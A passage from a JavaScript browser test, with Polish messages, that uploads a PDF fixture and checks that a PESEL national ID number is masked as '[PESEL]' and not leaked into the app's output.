      await app.page.locator('#file-input').setInputFiles(path.join(FIXTURES, 'pismo.pdf'));
      await app.waitForOutput('[PESEL]');
      const out = await resultText(app);
      assert.ok(!out.includes(PISMO_PESEL), `numer PESEL z PDF przeszedł do wyniku:\n${out}`);
    });
  } finally {
    await legacy.close();
  }
});
